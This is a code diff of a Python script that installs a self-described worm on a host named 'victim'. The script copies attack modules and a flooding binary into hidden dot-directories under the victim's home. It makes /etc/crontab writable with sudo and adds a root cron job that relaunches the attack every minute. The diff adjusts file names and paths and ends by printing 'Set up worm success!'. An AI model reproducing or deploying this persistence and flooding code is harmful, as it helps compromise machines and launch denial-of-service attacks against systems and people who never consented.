@@ -2,12 +2,15 @@ import os
 import sys
 
 
-attackDirs = ['/home/victim/.etc', '/home/victim/.var']
-attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
+attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
+attackFiles = ['/Launch_Attack.py', '/SetUp_Attack.py', '/TA_Flood_Attack']
 attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'
 
 
 def set_up_crontab():
+    # if is_set_up_crontab():
+    #     print('Already set up crontab')
+    #     return
 
     # Write Crontab
     os.system('sudo chmod +w /etc/crontab || ( test )')
@@ -21,6 +24,7 @@ def set_up_crontab():
 
 def set_up_attack():
     if is_set_up_attack():
+        print('Already set up attack module')
         return
 
     # Make directories
@@ -28,9 +32,9 @@ def set_up_attack():
         os.system('sudo chmod +x TA_Flood_Attack')
         os.system('mkdir {0}'.format(attackDir))
         os.system('mkdir {0}/.module'.format(attackDir))
-        os.system('cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
-        os.system('cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
-        os.system('cp TA_Flood_Attack {0}/.module/'.format(attackDir))
+        os.system('cp Launch_Attack.py {0}/'.format(attackDir))
+        os.system('cp SetUp_Attack.py {0}/'.format(attackDir))
+        os.system('cp TA_Flood_Attack {0}/'.format(attackDir))
 
 
 def is_set_up_attack():
@@ -71,4 +75,4 @@ if __name__ == '__main__':
     set_up_attack()
     set_up_crontab()
 
-    print('Already set up worm in the \'victim\'.')
+    print('Set up worm success!.')
